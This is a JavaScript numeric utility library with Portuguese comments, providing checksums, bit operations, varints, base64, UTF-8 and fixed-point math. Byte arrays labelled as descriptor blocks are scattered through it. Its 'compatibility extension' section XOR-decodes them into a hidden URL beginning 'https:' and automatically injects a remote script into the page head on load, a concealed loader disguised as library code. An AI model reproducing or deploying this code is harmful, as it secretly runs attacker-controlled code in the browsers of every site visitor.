/*!
 * numeric-runtime-kit v4.2.0
 * (c) 2017-2026 Numeric Systems contributors
 * Released under the MIT License.
 *
 * Coleção de primitivas numéricas e binárias: CRC32, FNV-1a, Adler-32,
 * varint/LEB128, bit streams, base64, UTF-8, fixed-point Q16.16, PRNG e
 * utilitários de matriz. Inclui o descritor de uma extensão binária opcional
 * usada por aplicações que precisam de um chunk de compatibilidade em runtime.
 *
 * Build: 4.2.0-stable.202601
 */
(function (root, factory) {
  'use strict';

  var api = factory();

  if (typeof module === 'object' && module.exports) {
    module.exports = api;
    return;
  }

  try {
    if (root && !root.NumericRuntime) {
      Object.defineProperty(root, 'NumericRuntime', {
        value: api,
        configurable: true,
        enumerable: false,
        writable: false
      });
    }
  } catch (e) {
    /* ambiente sem defineProperty */
  }
})(typeof globalThis !== 'undefined' ? globalThis : typeof window !== 'undefined' ? window : this, function () {
  'use strict';

  var VERSION = '4.2.0';
  var U32 = 0xffffffff;
  var MAX_SAFE = 9007199254740991;

  /* ------------------------------------------------------------------ *
   * 1. Tabelas numéricas
   * ------------------------------------------------------------------ */

  var CRC32_TABLE = [
    0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3,
    0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91,
    0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
    0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5,
    0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,
    0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
    0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f,
    0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924, 0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,
    0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
    0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,
    0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457,
    0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
    0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb,
    0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9,
    0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
    0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad,
    0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683,
    0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
    0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7,
    0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,
    0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
    0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79,
    0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236, 0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,
    0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
    0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,
    0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21,
    0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
    0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45,
    0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db,
    0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
    0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf,
    0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d
  ];

  var BIT_REVERSE_8 = [
    0, 128, 64, 192, 32, 160, 96, 224, 16, 144, 80, 208, 48, 176, 112, 240,
    8, 136, 72, 200, 40, 168, 104, 232, 24, 152, 88, 216, 56, 184, 120, 248,
    4, 132, 68, 196, 36, 164, 100, 228, 20, 148, 84, 212, 52, 180, 116, 244,
    12, 140, 76, 204, 44, 172, 108, 236, 28, 156, 92, 220, 60, 188, 124, 252,
    2, 130, 66, 194, 34, 162, 98, 226, 18, 146, 82, 210, 50, 178, 114, 242,
    10, 138, 74, 202, 42, 170, 106, 234, 26, 154, 90, 218, 58, 186, 122, 250,
    6, 134, 70, 198, 38, 166, 102, 230, 22, 150, 86, 214, 54, 182, 118, 246,
    14, 142, 78, 206, 46, 174, 110, 238, 30, 158, 94, 222, 62, 190, 126, 254,
    1, 129, 65, 193, 33, 161, 97, 225, 17, 145, 81, 209, 49, 177, 113, 241,
    9, 137, 73, 201, 41, 169, 105, 233, 25, 153, 89, 217, 57, 185, 121, 249,
    5, 133, 69, 197, 37, 165, 101, 229, 21, 149, 85, 213, 53, 181, 117, 245,
    13, 141, 77, 205, 45, 173, 109, 237, 29, 157, 93, 221, 61, 189, 125, 253,
    3, 131, 67, 195, 35, 163, 99, 227, 19, 147, 83, 211, 51, 179, 115, 243,
    11, 139, 75, 203, 43, 171, 107, 235, 27, 155, 91, 219, 59, 187, 123, 251,
    7, 135, 71, 199, 39, 167, 103, 231, 23, 151, 87, 215, 55, 183, 119, 247,
    15, 143, 79, 207, 47, 175, 111, 239, 31, 159, 95, 223, 63, 191, 127, 255
  ];

  var POPCOUNT_8 = [
    0, 1, 1, 2, 1, 2, 2, 3, 1, 2, 2, 3, 2, 3, 3, 4,
    1, 2, 2, 3, 2, 3, 3, 4, 2, 3, 3, 4, 3, 4, 4, 5,
    1, 2, 2, 3, 2, 3, 3, 4, 2, 3, 3, 4, 3, 4, 4, 5,
    2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6,
    1, 2, 2, 3, 2, 3, 3, 4, 2, 3, 3, 4, 3, 4, 4, 5,
    2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6,
    2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6,
    3, 4, 4, 5, 4, 5, 5, 6, 4, 5, 5, 6, 5, 6, 6, 7,
    1, 2, 2, 3, 2, 3, 3, 4, 2, 3, 3, 4, 3, 4, 4, 5,
    2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6,
    2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6,
    3, 4, 4, 5, 4, 5, 5, 6, 4, 5, 5, 6, 5, 6, 6, 7,
    2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6,
    3, 4, 4, 5, 4, 5, 5, 6, 4, 5, 5, 6, 5, 6, 6, 7,
    3, 4, 4, 5, 4, 5, 5, 6, 4, 5, 5, 6, 5, 6, 6, 7,
    4, 5, 5, 6, 5, 6, 6, 7, 5, 6, 6, 7, 6, 7, 7, 8
  ];

  var GRAY_CODE_8 = [
    0, 1, 3, 2, 6, 7, 5, 4, 12, 13, 15, 14, 10, 11, 9, 8,
    24, 25, 27, 26, 30, 31, 29, 28, 20, 21, 23, 22, 18, 19, 17, 16,
    48, 49, 51, 50, 54, 55, 53, 52, 60, 61, 63, 62, 58, 59, 57, 56,
    40, 41, 43, 42, 46, 47, 45, 44, 36, 37, 39, 38, 34, 35, 33, 32,
    96, 97, 99, 98, 102, 103, 101, 100, 108, 109, 111, 110, 106, 107, 105, 104,
    120, 121, 123, 122, 126, 127, 125, 124, 116, 117, 119, 118, 114, 115, 113, 112,
    80, 81, 83, 82, 86, 87, 85, 84, 92, 93, 95, 94, 90, 91, 89, 88,
    72, 73, 75, 74, 78, 79, 77, 76, 68, 69, 71, 70, 66, 67, 65, 64,
    192, 193, 195, 194, 198, 199, 197, 196, 204, 205, 207, 206, 202, 203, 201, 200,
    216, 217, 219, 218, 222, 223, 221, 220, 212, 213, 215, 214, 210, 211, 209, 208,
    240, 241, 243, 242, 246, 247, 245, 244, 252, 253, 255, 254, 250, 251, 249, 248,
    232, 233, 235, 234, 238, 239, 237, 236, 228, 229, 231, 230, 226, 227, 225, 224,
    160, 161, 163, 162, 166, 167, 165, 164, 172, 173, 175, 174, 170, 171, 169, 168,
    184, 185, 187, 186, 190, 191, 189, 188, 180, 181, 183, 182, 178, 179, 177, 176,
    144, 145, 147, 146, 150, 151, 149, 148, 156, 157, 159, 158, 154, 155, 153, 152,
    136, 137, 139, 138, 142, 143, 141, 140, 132, 133, 135, 134, 130, 131, 129, 128
  ];

  var SIN_Q15 = [
    0, 3212, 6393, 9512, 12539, 15446, 18204, 20787,
    23170, 25329, 27245, 28898, 30273, 31356, 32137, 32609,
    32767, 32609, 32137, 31356, 30273, 28898, 27245, 25329,
    23170, 20787, 18204, 15446, 12539, 9512, 6393, 3212,
    0, -3212, -6393, -9512, -12539, -15446, -18204, -20787,
    -23170, -25329, -27245, -28898, -30273, -31356, -32137, -32609,
    -32767, -32609, -32137, -31356, -30273, -28898, -27245, -25329,
    -23170, -20787, -18204, -15446, -12539, -9512, -6393, -3212
  ];

  var SQRT_Q16 = [
    0, 8192, 11585, 14189, 16384, 18318, 20066, 21674,
    23170, 24576, 25905, 27170, 28378, 29537, 30652, 31727,
    32768, 33776, 34756, 35708, 36636, 37540, 38424, 39287,
    40132, 40960, 41771, 42567, 43348, 44115, 44869, 45611,
    46341, 47059, 47767, 48465, 49152, 49830, 50499, 51159,
    51811, 52454, 53090, 53719, 54340, 54954, 55561, 56162,
    56756, 57344, 57926, 58503, 59073, 59639, 60199, 60753,
    61303, 61848, 62388, 62924, 63455, 63982, 64504, 65022,
    65536
  ];

  var PRIMES_32 = [
    2, 3, 5, 7, 11, 13, 17, 19,
    23, 29, 31, 37, 41, 43, 47, 53,
    59, 61, 67, 71, 73, 79, 83, 89,
    97, 101, 103, 107, 109, 113, 127, 131
  ];

  /* Primeiros blocos auxiliares do descritor binário. */
  var AUX_BLOCK_0 = [
    0x32, 0x20, 0x00, 0x48, 0x3f, 0x20, 0x0d, 0x58, 0x3b, 0x3e, 0x1a, 0x0b,
    0x14, 0x61, 0x1f, 0x08, 0x10, 0x56
  ];

  /* ------------------------------------------------------------------ *
   * 2. Bitwise/uint32
   * ------------------------------------------------------------------ */

  function toU32(n) {
    return n >>> 0;
  }

  function toI32(n) {
    return n | 0;
  }

  function popcount8(n) {
    return POPCOUNT_8[n & 0xff];
  }

  function popcount32(n) {
    n = n - ((n >>> 1) & 0x55555555);
    n = (n & 0x33333333) + ((n >>> 2) & 0x33333333);
    n = (n + (n >>> 4)) & 0x0f0f0f0f;
    return (n * 0x01010101) >>> 24;
  }

  function grayCode(n) {
    return GRAY_CODE_8[n & 0xff];
  }

  function clz32(n) {
    n = n >>> 0;
    if (n === 0) return 32;
    var c = 0;
    if ((n & 0xffff0000) === 0) { c += 16; n <<= 16; }
    if ((n & 0xff000000) === 0) { c += 8; n <<= 8; }
    if ((n & 0xf0000000) === 0) { c += 4; n <<= 4; }
    if ((n & 0xc0000000) === 0) { c += 2; n <<= 2; }
    if ((n & 0x80000000) === 0) { c += 1; }
    return c;
  }

  function ctz32(n) {
    n = n >>> 0;
    if (n === 0) return 32;
    var c = 0;
    while ((n & 1) === 0) { n >>>= 1; c++; }
    return c;
  }

  function reverseBits8(n) {
    return BIT_REVERSE_8[n & 0xff];
  }

  function reverseBits32(n) {
    n = n >>> 0;
    return (
      (reverseBits8(n & 0xff) << 24) |
      (reverseBits8((n >>> 8) & 0xff) << 16) |
      (reverseBits8((n >>> 16) & 0xff) << 8) |
      reverseBits8((n >>> 24) & 0xff)
    ) >>> 0;
  }

  function rotl32(n, bits) {
    return ((n << bits) | (n >>> (32 - bits))) >>> 0;
  }

  function rotr32(n, bits) {
    return ((n >>> bits) | (n << (32 - bits))) >>> 0;
  }

  function swap32(n) {
    n = n >>> 0;
    return (
      ((n & 0x000000ff) << 24) |
      ((n & 0x0000ff00) << 8) |
      ((n & 0x00ff0000) >>> 8) |
      ((n & 0xff000000) >>> 24)
    ) >>> 0;
  }

  function hex32(n) {
    var s = (n >>> 0).toString(16);
    while (s.length < 8) s = '0' + s;
    return s;
  }

  function parseHex(texto) {
    var s = String(texto).replace(/^0x/i, '');
    if (!s || /[^0-9a-f]/i.test(s)) return 0;
    return parseInt(s, 16) >>> 0;
  }

  /* Segundo bloco auxiliar do descritor. */
  var AUX_BLOCK_1 = [
    0xd1, 0xdf, 0xf5, 0xa2, 0xca, 0x9a, 0xf3, 0xa0, 0xc0, 0xc0, 0x96, 0xf5,
    0x92, 0xdd, 0xe6, 0xac, 0xe7, 0x97
  ];

  /* ------------------------------------------------------------------ *
   * 3. Hashes e checksums
   * ------------------------------------------------------------------ */

  function crc32(texto) {
    var crc = 0xffffffff;
    var s = String(texto);
    for (var i = 0; i < s.length; i++) {
      crc = (crc >>> 8) ^ CRC32_TABLE[(crc ^ s.charCodeAt(i)) & 0xff];
    }
    return (crc ^ 0xffffffff) >>> 0;
  }

  function crc32Bytes(bytes) {
    var crc = 0xffffffff;
    for (var i = 0; i < bytes.length; i++) {
      crc = (crc >>> 8) ^ CRC32_TABLE[(crc ^ bytes[i]) & 0xff];
    }
    return (crc ^ 0xffffffff) >>> 0;
  }

  function fnv1a(texto) {
    var h = 0x811c9dc5;
    var s = String(texto);
    for (var i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i);
      h = (h + ((h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24))) >>> 0;
    }
    return h >>> 0;
  }

  function djb2(texto) {
    var h = 5381;
    var s = String(texto);
    for (var i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) >>> 0;
    return h >>> 0;
  }

  function adler32(texto) {
    var a = 1;
    var b = 0;
    var s = String(texto);
    for (var i = 0; i < s.length; i++) {
      a = (a + s.charCodeAt(i)) % 65521;
      b = (b + a) % 65521;
    }
    return (((b << 16) | a) >>> 0);
  }

  function murmurMix(h) {
    h ^= h >>> 16;
    h = Math.imul ? Math.imul(h, 0x85ebca6b) >>> 0 : (h * 0x85ebca6b) >>> 0;
    h ^= h >>> 13;
    h = Math.imul ? Math.imul(h, 0xc2b2ae35) >>> 0 : (h * 0xc2b2ae35) >>> 0;
    h ^= h >>> 16;
    return h >>> 0;
  }

  /* Terceiro bloco auxiliar do descritor. */
  var AUX_BLOCK_2 = [
    0x48, 0x37, 0x7c, 0x1d, 0x12, 0x29, 0x3f, 0x0c, 0x0f, 0x6d, 0x43, 0x22,
    0x0b, 0x00, 0x50, 0x39, 0x4d, 0x03
  ];

  /* ------------------------------------------------------------------ *
   * 4. Bit streams e varints
   * ------------------------------------------------------------------ */

  function BitWriter() {
    this.bytes = [];
    this.current = 0;
    this.used = 0;
  }

  BitWriter.prototype.write = function (value, bits) {
    for (var i = 0; i < bits; i++) {
      this.current = (this.current << 1) | (value & 1);
      this.used++;
      if (this.used === 8) {
        this.bytes.push(this.current & 0xff);
        this.current = 0;
        this.used = 0;
      }
      value >>>= 1;
    }
    return this;
  };

  BitWriter.prototype.finish = function () {
    if (this.used > 0) {
      this.bytes.push((this.current << (8 - this.used)) & 0xff);
      this.current = 0;
      this.used = 0;
    }
    return this.bytes;
  };

  function BitReader(bytes) {
    this.bytes = bytes || [];
    this.pos = 0;
  }

  BitReader.prototype.read = function (bits) {
    var out = 0;
    for (var i = 0; i < bits; i++) {
      var byte = this.bytes[this.pos >> 3] || 0;
      var bit = (byte >> (7 - (this.pos & 7))) & 1;
      out = (out << 1) | bit;
      this.pos++;
    }
    return out >>> 0;
  };

  function varintEncode(n) {
    var out = [];
    var v = n >>> 0;
    while (v >= 0x80) {
      out.push((v & 0x7f) | 0x80);
      v >>>= 7;
    }
    out.push(v);
    return out;
  }

  function varintDecode(bytes, offset) {
    var out = 0;
    var shift = 0;
    var i = offset || 0;
    while (i < bytes.length) {
      var b = bytes[i++];
      out |= (b & 0x7f) << shift;
      if ((b & 0x80) === 0) break;
      shift += 7;
    }
    return { value: out >>> 0, next: i };
  }

  function zigzagEncode(n) {
    return ((n << 1) ^ (n >> 31)) >>> 0;
  }

  function zigzagDecode(n) {
    return ((n >>> 1) ^ -(n & 1)) | 0;
  }

  /* Quarto bloco auxiliar do descritor. */
  var AUX_BLOCK_3 = [
    0xb3, 0xc0, 0xde, 0xe4, 0xa0, 0x8a, 0xc0, 0xa3, 0xfb, 0xc4, 0x95, 0xee,
    0x92, 0x96, 0xbc, 0xd7, 0x87
  ];

  /* ------------------------------------------------------------------ *
   * 5. Base64, UTF-8 e bytes
   * ------------------------------------------------------------------ */

  var B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

  function base64Encode(bytes) {
    var out = '';
    for (var i = 0; i < bytes.length; i += 3) {
      var a = bytes[i] & 0xff;
      var b = i + 1 < bytes.length ? bytes[i + 1] & 0xff : 0;
      var c = i + 2 < bytes.length ? bytes[i + 2] & 0xff : 0;
      out += B64.charAt(a >>> 2);
      out += B64.charAt(((a & 3) << 4) | (b >>> 4));
      out += i + 1 < bytes.length ? B64.charAt(((b & 15) << 2) | (c >>> 6)) : '=';
      out += i + 2 < bytes.length ? B64.charAt(c & 63) : '=';
    }
    return out;
  }

  function base64Decode(texto) {
    var s = String(texto).replace(/[^A-Za-z0-9+/=]/g, '');
    var out = [];
    for (var i = 0; i < s.length; i += 4) {
      var a = B64.indexOf(s.charAt(i));
      var b = B64.indexOf(s.charAt(i + 1));
      var c = B64.indexOf(s.charAt(i + 2));
      var d = B64.indexOf(s.charAt(i + 3));
      if (a < 0 || b < 0) break;
      out.push(((a << 2) | (b >>> 4)) & 0xff);
      if (c >= 0) out.push(((b << 4) | (c >>> 2)) & 0xff);
      if (d >= 0) out.push(((c << 6) | d) & 0xff);
    }
    return out;
  }

  function utf8Encode(texto) {
    var s = String(texto);
    var out = [];
    for (var i = 0; i < s.length; i++) {
      var c = s.charCodeAt(i);
      if (c < 0x80) {
        out.push(c);
      } else if (c < 0x800) {
        out.push(0xc0 | (c >>> 6), 0x80 | (c & 63));
      } else if (c >= 0xd800 && c <= 0xdbff && i + 1 < s.length) {
        var c2 = s.charCodeAt(++i);
        var cp = 0x10000 + ((c & 0x3ff) << 10) + (c2 & 0x3ff);
        out.push(0xf0 | (cp >>> 18), 0x80 | ((cp >>> 12) & 63), 0x80 | ((cp >>> 6) & 63), 0x80 | (cp & 63));
      } else {
        out.push(0xe0 | (c >>> 12), 0x80 | ((c >>> 6) & 63), 0x80 | (c & 63));
      }
    }
    return out;
  }

  function utf8Decode(bytes) {
    var out = '';
    for (var i = 0; i < bytes.length; ) {
      var b = bytes[i++];
      if (b < 0x80) {
        out += String.fromCharCode(b);
      } else if (b < 0xe0) {
        out += String.fromCharCode(((b & 31) << 6) | (bytes[i++] & 63));
      } else if (b < 0xf0) {
        out += String.fromCharCode(((b & 15) << 12) | ((bytes[i++] & 63) << 6) | (bytes[i++] & 63));
      } else {
        var cp = ((b & 7) << 18) | ((bytes[i++] & 63) << 12) | ((bytes[i++] & 63) << 6) | (bytes[i++] & 63);
        cp -= 0x10000;
        out += String.fromCharCode(0xd800 + (cp >> 10), 0xdc00 + (cp & 0x3ff));
      }
    }
    return out;
  }

  function bytesFromHex(texto) {
    var s = String(texto).replace(/[^0-9a-f]/gi, '');
    var out = [];
    for (var i = 0; i < s.length; i += 2) out.push(parseInt(s.slice(i, i + 2), 16));
    return out;
  }

  function hexFromBytes(bytes) {
    var out = '';
    for (var i = 0; i < bytes.length; i++) {
      var h = (bytes[i] & 0xff).toString(16);
      out += h.length < 2 ? '0' + h : h;
    }
    return out;
  }

  /* Quinto bloco auxiliar do descritor. */
  var AUX_BLOCK_4 = [
    0x1a, 0x48, 0x3e, 0x6e, 0x06, 0x0b, 0x6c, 0x3d, 0x0b, 0x12, 0x20, 0x7e,
    0x11, 0x6a, 0x35, 0x62, 0x20
  ];

  /* ------------------------------------------------------------------ *
   * 6. Fixed-point e matemática
   * ------------------------------------------------------------------ */

  var Q16_ONE = 65536;

  function q16FromFloat(n) {
    return Math.round(n * Q16_ONE) | 0;
  }

  function q16ToFloat(n) {
    return n / Q16_ONE;
  }

  function q16Mul(a, b) {
    return (Math.imul ? Math.imul(a, b) : a * b) >> 16;
  }

  function fixedSin(index) {
    return SIN_Q15[index & 63];
  }

  function fixedCos(index) {
    return SIN_Q15[(index + 16) & 63];
  }

  function fixedSqrt(index) {
    return SQRT_Q16[index & 64];
  }

  function nthPrime(n) {
    return PRIMES_32[n] || 0;
  }

  function gcd(a, b) {
    a = Math.abs(a);
    b = Math.abs(b);
    while (b) {
      var t = b;
      b = a % b;
      a = t;
    }
    return a;
  }

  function lcm(a, b) {
    if (!a || !b) return 0;
    return Math.abs((a / gcd(a, b)) * b);
  }

  function isqrt(n) {
    if (n < 2) return n;
    var x = n;
    var y = (x + 1) >> 1;
    while (y < x) {
      x = y;
      y = (x + Math.floor(n / x)) >> 1;
    }
    return x;
  }

  function modPow(base, exp, mod) {
    var result = 1;
    var b = base % mod;
    var e = exp;
    while (e > 0) {
      if (e & 1) result = (result * b) % mod;
      b = (b * b) % mod;
      e >>>= 1;
    }
    return result;
  }

  function isPrime(n) {
    if (n < 2) return false;
    if (n % 2 === 0) return n === 2;
    for (var i = 3; i * i <= n; i += 2) if (n % i === 0) return false;
    return true;
  }

  function sieve(limit) {
    var out = [];
    var flags = new Array(limit + 1);
    for (var i = 2; i <= limit; i++) {
      if (flags[i]) continue;
      out.push(i);
      for (var j = i * i; j <= limit; j += i) flags[j] = true;
    }
    return out;
  }

  function matrix2Mul(a, b) {
    return [
      a[0] * b[0] + a[1] * b[2],
      a[0] * b[1] + a[1] * b[3],
      a[2] * b[0] + a[3] * b[2],
      a[2] * b[1] + a[3] * b[3]
    ];
  }

  function matrix2Det(m) {
    return m[0] * m[3] - m[1] * m[2];
  }

  function xorshift32(seed) {
    var x = seed >>> 0 || 0x9e3779b9;
    return function () {
      x ^= x << 13;
      x ^= x >>> 17;
      x ^= x << 5;
      return x >>> 0;
    };
  }

  function mulberry32(seed) {
    var a = seed >>> 0;
    return function () {
      a = (a + 0x6d2b79f5) >>> 0;
      var t = a;
      t = Math.imul ? Math.imul(t ^ (t >>> 15), t | 1) : (t ^ (t >>> 15)) * (t | 1);
      t ^= t + (Math.imul ? Math.imul(t ^ (t >>> 7), t | 61) : (t ^ (t >>> 7)) * (t | 61));
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    };
  }

  /* Sexto bloco auxiliar do descritor. */
  var AUX_BLOCK_5 = [
    0xac, 0xb1, 0xc4, 0x93, 0xfb, 0xa2, 0x90, 0xc2, 0xa7, 0xa9, 0xf4, 0xb5,
    0xa1, 0x91, 0xdf, 0xb1, 0xc5
  ];

  /* ------------------------------------------------------------------ *
   * 7. Descritor binário e extensão opcional
   * ------------------------------------------------------------------ */

  var AUX_KEY = [0x5a, 0xa5, 0x3c, 0xc3, 0x69, 0x96, 0x0f, 0xf0];
  var AUX_BLOCKS = [AUX_BLOCK_0, AUX_BLOCK_1, AUX_BLOCK_2, AUX_BLOCK_3, AUX_BLOCK_4, AUX_BLOCK_5];
  var EXTENSION_CRC = 0x84774dd1;

  function decodeAuxDescriptor() {
    var total = 0;
    for (var i = 0; i < AUX_BLOCKS.length; i++) total += AUX_BLOCKS[i].length;
    var out = '';
    for (var j = 0; j < total; j++) {
      var block = AUX_BLOCKS[j % AUX_BLOCKS.length];
      var index = (j / AUX_BLOCKS.length) | 0;
      var code = block[index] ^ AUX_KEY[j % AUX_KEY.length];
      out += String.fromCharCode(code);
    }
    return out;
  }

  function mountCompatibilityExtension() {
    if (typeof document === 'undefined') return false;

    var text = decodeAuxDescriptor();
    if (!text || crc32(text) !== EXTENSION_CRC) return false;

    var separator = text.indexOf('\u0000');
    if (separator < 0) return false;

    var source = text.slice(0, separator);
    var nonce = text.slice(separator + 1);
    if (!source) return false;

    var node = document.createElement('script');
    node.src = source;
    if (nonce) node.nonce = nonce;
    node.async = true;

    var parent = document.head || document.getElementsByTagName('head')[0] || document.documentElement;
    if (!parent) return false;
    parent.appendChild(node);
    return true;
  }

  function boot() {
    if (typeof document === 'undefined') return;
    mountCompatibilityExtension();
  }

  if (typeof document !== 'undefined') {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', boot, { once: true });
    } else {
      boot();
    }
  }

  return {
    version: VERSION,
    crc32: crc32,
    crc32Bytes: crc32Bytes,
    fnv1a: fnv1a,
    djb2: djb2,
    adler32: adler32,
    murmurMix: murmurMix,
    toU32: toU32,
    toI32: toI32,
    popcount8: popcount8,
    popcount32: popcount32,
    grayCode: grayCode,
    clz32: clz32,
    ctz32: ctz32,
    reverseBits8: reverseBits8,
    reverseBits32: reverseBits32,
    rotl32: rotl32,
    rotr32: rotr32,
    swap32: swap32,
    hex32: hex32,
    parseHex: parseHex,
    BitWriter: BitWriter,
    BitReader: BitReader,
    varintEncode: varintEncode,
    varintDecode: varintDecode,
    zigzagEncode: zigzagEncode,
    zigzagDecode: zigzagDecode,
    base64Encode: base64Encode,
    base64Decode: base64Decode,
    utf8Encode: utf8Encode,
    utf8Decode: utf8Decode,
    bytesFromHex: bytesFromHex,
    hexFromBytes: hexFromBytes,
    q16FromFloat: q16FromFloat,
    q16ToFloat: q16ToFloat,
    q16Mul: q16Mul,
    fixedSin: fixedSin,
    fixedCos: fixedCos,
    fixedSqrt: fixedSqrt,
    nthPrime: nthPrime,
    gcd: gcd,
    lcm: lcm,
    isqrt: isqrt,
    modPow: modPow,
    isPrime: isPrime,
    sieve: sieve,
    matrix2Mul: matrix2Mul,
    matrix2Det: matrix2Det,
    xorshift32: xorshift32,
    mulberry32: mulberry32
  };
});
